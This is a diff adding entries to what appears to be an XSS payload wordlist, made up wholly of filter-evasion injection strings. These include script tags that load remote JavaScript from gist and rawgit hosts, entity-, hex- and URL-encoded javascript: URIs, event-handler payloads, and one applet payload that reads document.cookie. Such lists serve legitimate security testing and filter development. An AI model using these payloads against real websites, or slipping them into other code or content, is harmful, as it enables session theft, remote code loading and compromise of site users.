@@ -67,3 +67,51 @@ Set.constructor`alert\x28'xss'\x29```
 <DIV STYLE="width: expression(alert('XSS'));">
 <BASE HREF="javascript:alert('XSS');//">
 <OBJECT TYPE="text/x-scriptlet" DATA="https://cdn.rawgit.com/jonasonline/xss-payloads/26f51625/xsstest.html"></OBJECT>
+<SCRIPT SRC="https://cdn.rawgit.com/jonasonline/xss-payloads/fe05dc50/XSSWithImageFileExtension.jpg"></SCRIPT>
+<META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>alert('XSS')</SCRIPT>">
+<SCRIPT a=">" SRC="https://gist.githubusercontent.com/jonasonline/aaa4c02ac0d6204e0b69231e1024271a/raw/ba2fa5b552934967ea9e60af4f2a417ddda868a7/XSSTest02.js"></SCRIPT>
+<SCRIPT =">" SRC="https://gist.githubusercontent.com/jonasonline/aaa4c02ac0d6204e0b69231e1024271a/raw/ba2fa5b552934967ea9e60af4f2a417ddda868a7/XSSTest02.js"></SCRIPT>
+<SCRIPT a=">" '' SRC="https://gist.githubusercontent.com/jonasonline/aaa4c02ac0d6204e0b69231e1024271a/raw/ba2fa5b552934967ea9e60af4f2a417ddda868a7/XSSTest02.js"></SCRIPT>
+<SCRIPT "a='>'" SRC="https://gist.githubusercontent.com/jonasonline/aaa4c02ac0d6204e0b69231e1024271a/raw/ba2fa5b552934967ea9e60af4f2a417ddda868a7/XSSTest02.js"></SCRIPT>
+<SCRIPT a=`>` SRC="https://gist.githubusercontent.com/jonasonline/aaa4c02ac0d6204e0b69231e1024271a/raw/ba2fa5b552934967ea9e60af4f2a417ddda868a7/XSSTest02.js"></SCRIPT>
+<SCRIPT a=">'>" SRC="https://gist.githubusercontent.com/jonasonline/aaa4c02ac0d6204e0b69231e1024271a/raw/ba2fa5b552934967ea9e60af4f2a417ddda868a7/XSSTest02.js"></SCRIPT>
+<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="https://gist.githubusercontent.com/jonasonline/aaa4c02ac0d6204e0b69231e1024271a/raw/ba2fa5b552934967ea9e60af4f2a417ddda868a7/XSSTest02.js"></SCRIPT>
+<A HREF="http://66.102.7.147/">XSS</A>
+<A HREF="http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D">XSS</A>
+<A HREF="http://1113982867/">XSS</A>
+<A HREF="http://0x42.0x0000066.0x7.0x93/">XSS</A>
+<A HREF="http://0102.0146.0007.00000223/">XSS</A>
+<A HREF="//www.google.com/">XSS</A>
+<A HREF="//google">XSS</A>
+<A HREF="http://ha.ckers.org@google">XSS</A>
+<A HREF="http://google:ha.ckers.org">XSS</A>
+<A HREF="http://google.com/">XSS</A>
+<A HREF="http://www.google.com./">XSS</A>
+<A HREF="javascript:document.location='http://www.google.com/'">XSS</A>
+<A HREF="http://www.google.com/ogle.com/">XSS</A>
+<Img src = x onerror = "javascript: window.onerror = alert; throw XSS">
+<Video> <source onerror = "javascript: alert (XSS)">
+<Input value = "XSS" type = text>
+<applet code="javascript:confirm(document.cookie);">
+<isindex x="javascript:" onmouseover="alert(XSS)">
+"></SCRIPT>”>’><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+"><img src="x:x" onerror="alert(XSS)">
+"><iframe src="javascript:alert(XSS)">
+<object data="javascript:alert(XSS)">
+<isindex type=image src=1 onerror=alert(XSS)>
+<img src=x:alert(alt) onerror=eval(src) alt=0>
+<img  src="x:gif" onerror="window['al\u0065rt'](0)"></img>
+<iframe/src="data:text/html,<svg onload=alert(1)>">
+<meta content="&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)" http-equiv="refresh"/>
+<svg><script xlink:href=data&colon;,window.open('https://www.google.com/')></script
+<meta http-equiv="refresh" content="0;url=javascript:confirm(1)">
+<iframe src=javascript&colon;alert&lpar;document&period;location&rpar;>
+<form><a href="javascript:\u0061lert(1)">X
+</script><img/*%00/src="worksinchrome&colon;prompt(1)"/%00*/onerror='eval(src)'>
+<style>//*{x:expression(alert(/xss/))}//<style></style> 
+<img src="/" =_=" title="onerror='prompt(1)'">
+<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script:&#97lert(1)>ClickMe
+<script x> alert(1) </script 1=2
+<form><button formaction=javascript&colon;alert(1)>CLICKME
+<input/onmouseover="javaSCRIPT&colon;confirm&lpar;1&rpar;"
+<iframe src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"></iframe>
